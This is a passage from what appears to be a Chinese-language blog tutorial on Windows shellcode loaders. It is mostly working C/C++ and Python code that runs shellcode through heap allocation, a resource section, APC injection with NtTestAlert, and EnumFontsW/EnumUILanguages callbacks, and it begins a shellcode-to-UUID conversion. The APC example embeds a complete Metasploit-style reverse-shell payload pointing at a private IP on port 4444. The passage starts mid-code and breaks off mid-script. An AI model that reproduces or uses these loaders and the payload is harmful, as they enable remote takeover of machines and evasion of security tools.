ctypes.windll.kernel32.CreateThread(</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过WaitForSingleObject函数来等待执行结束</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>



<h1 id="4-通过堆加载"><a href="#4-通过堆加载" class="headerlink" title="4.通过堆加载"></a>4.通过堆加载</h1><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 shellcode（恶意代码）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆，以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面是另一种创建线程的方法，这里被注释掉了</span></span><br><span class="line">    <span class="comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span></span><br><span class="line">    <span class="comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新线程执行完毕</span></span><br><span class="line">    <span class="comment">// WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="5-基于资源节加载"><a href="#5-基于资源节加载" class="headerlink" title="5.基于资源节加载"></a>5.基于资源节加载</h1><h2 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h2><p>使用MSF生成bin文件，随后点击<code>添加资源-&gt;导入</code>，并选择生成的bin文件</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419150951949.png" alt="image-20230419150951949">	</p>
<p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419151102352.png" alt="image-20230419151102352">	</p>
<p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码<code>#define IDR_SHELLCODE1 101</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span></span><br><span class="line"><span class="comment">// Microsoft Visual C++ 生成的包含文件。</span></span><br><span class="line"><span class="comment">// 供 Shellcode加载器.rc 使用</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDR_SHELLCODE1                  101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Next default values for new objects</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> APSTUDIO_INVOKED</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>以下是完整shellcode加载器代码: </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过资源加载ShellCode</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ResourceLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span></span><br><span class="line"><span class="comment">    HRSRC FindResource(</span></span><br><span class="line"><span class="comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span></span><br><span class="line"><span class="comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span></span><br><span class="line"><span class="comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    如果查找成功，则返回资源句柄；否则返回NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HRSRC Res = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="string">L&quot;shellcode&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于获取资源的大小</span></span><br><span class="line">    DWORD ResSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span></span><br><span class="line">    HGLOBAL Load = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, Load, ResSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ResourceLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	</p>
<h1 id="6-基于APC注入"><a href="#6-基于APC注入" class="headerlink" title="6.基于APC注入"></a>6.基于APC注入</h1><h2 id="什么是APC队列"><a href="#什么是APC队列" class="headerlink" title="什么是APC队列"></a>什么是APC队列</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I&#x2F;O 操作。</p>
<p>APC 队列包含两种类型的 APC：</p>
<ol>
<li>内核模式 APC：由内核代码发起，通常用于处理内核级别的异步操作，如异步 I&#x2F;O 完成。</li>
<li>用户模式 APC：由用户代码发起，允许用户态应用程序将特定函数插入到线程的 APC 队列中，以便在线程上下文中异步执行</li>
</ol>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写（<code>PAGE_EXECUTE_READWRITE</code>），以便执行其中的代码。</li>
<li>获取 <code>NtTestAlert</code> 函数的地址。这是一个内部函数，无法直接通过函数名调用。<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列。如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行。</li>
<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务。这将在 <code>NtTestAlert</code> 被调用时执行 Shellcode。</li>
<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>
</ul>
<h2 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h2><p>该代码通过在当前线程的 APC 队列中添加一个执行 Shellcode 的任务，并调用 <code>NtTestAlert</code> 函数触发 APC 队列中的任务执行，从而实现了加载并执行 Shellcode 的目的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApcLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 修改 shellcode 所在内存区域的保护属性，允许执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span></span><br><span class="line"><span class="comment">    这个函数用于检查当前线程的 APC（Asynchronous Procedure Call，异步过程调用）队列，如</span></span><br><span class="line"><span class="comment">    果队列中有挂起的用户模式 APC 请求，NtTestAlert 将触发它们的执行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pNtTestAlert NtTestAlert = (pNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span></span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)shellcode, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span></span><br><span class="line">    <span class="built_in">NtTestAlert</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ApcLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="7-基于回调函数"><a href="#7-基于回调函数" class="headerlink" title="7.基于回调函数"></a>7.基于回调函数</h1><h2 id="EnumFontsW"><a href="#EnumFontsW" class="headerlink" title="EnumFontsW"></a>EnumFontsW</h2><p>这段代码的关键在于它使用 <code>EnumFontsW</code> 函数的回调机制来执行 shellcode。当 <code>EnumFontsW</code> 函数遍历到一个字体时，它将调用 shellcode 作为回调函数来处理字体信息。由于回调函数直接指向 shellcode，这样可以间接地加载并执行 shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * EnumFontsW是Windows API，用于枚举系统中所有可用字体</span></span><br><span class="line"><span class="comment">    * 参数1：设备环境句柄，表示要枚举哪个设备的字体</span></span><br><span class="line"><span class="comment">    * 参数2：NULL表示枚举所有字体</span></span><br><span class="line"><span class="comment">    * 参数3：回调函数指针，用于处理每个枚举到的字体信息</span></span><br><span class="line"><span class="comment">    * 参数4：回调函数参数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)p, <span class="literal">NULL</span>); <span class="comment">//回调函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EnumUILanguages"><a href="#EnumUILanguages" class="headerlink" title="EnumUILanguages"></a>EnumUILanguages</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    EnumUILanguages 函数是在 Windows 操作系统中使用的一个函数，它用于列举安装在系统上的用户界面语言（UI language）</span></span><br><span class="line"><span class="comment">    参数1:指向回调函数的指针,这个回调函数将在每个列举到的用户界面语言上被调用</span></span><br><span class="line"><span class="comment">    参数2:指定列举语言时的选项和标志</span></span><br><span class="line"><span class="comment">    参数3:应用程序定义的一个参数，它将传递给回调函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)p, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="8-基于uuid"><a href="#8-基于uuid" class="headerlink" title="8.基于uuid"></a>8.基于uuid</h1><h2 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h2><p>UUID（Universally Unique Identifier，通用唯一识别码）是一种为计算机系统中的所有对象分配一个唯一标识符的软件构建块。UUID 是 128 位的数字，通常由 32 个十六进制(16个字节)数字表示，并由连字符分隔成五个部分，形式为 8-4-4-4-12。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>

<p>UUID 的目的是在没有中央协调机构的情况下，能够在分布式系统中生成唯一标识符。这意味着，任何人在任何地方都可以创建一个 UUID，而无需担心与其他人创建的 UUID 冲突。UUID 的设计使得它们的全局唯一性非常高，即使在不同的计算机系统和网络中也能保持唯一性。</p>
<p>UUID 通常用于以下场景：</p>
<ul>
<li>数据库中的主键：用 UUID 作为数据库表的主键，确保每个记录都具有唯一的标识符，避免数据冲突。</li>
<li>分布式系统中的对象标识符：在分布式系统中，由于系统组件可能位于不同的计算机或网络上，使用 UUID 作为对象的唯一标识符有助于确保唯一性。</li>
<li>会话标识符：在网络应用中，使用 UUID 作为会话标识符可以确保每个会话都有唯一的识别码。</li>
<li>临时文件名：当需要创建临时文件时，使用 UUID 作为文件名可以确保不会与现有文件冲突。</li>
</ul>
<h2 id="什么是GUID"><a href="#什么是GUID" class="headerlink" title="什么是GUID"></a>什么是GUID</h2><p>GUID（Globally Unique Identifier，全局唯一标识符）是一个 128 位长的数字，用于在软件中为对象分配唯一的标识符。GUID 和 UUID（Universally Unique Identifier）基本上是相同的概念，只是术语上的差别。实际上，GUID 是 UUID 的一种实现。</p>
<p>GUID 通常表示为 32 个十六进制数字，分为五组，用连字符分隔，形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>



<h2 id="shellcode转uuid"><a href="#shellcode转uuid" class="headerlink" title="shellcode转uuid"></a>shellcode转uuid</h2><p>这段代码首先将包含 shellcode 的字节数组进行处理，确保长度是 16 的倍数。然后，将 shellcode 分为 16 字节的块，并为每个块创建一个 UUID，将这些 UUID 存储在一个列表中。最后，将这些 UUID 以 C 语言数组的形式输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用cs或msf生成的python类型的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c&quot;</span></span><br><span class="line">shellcode += <span 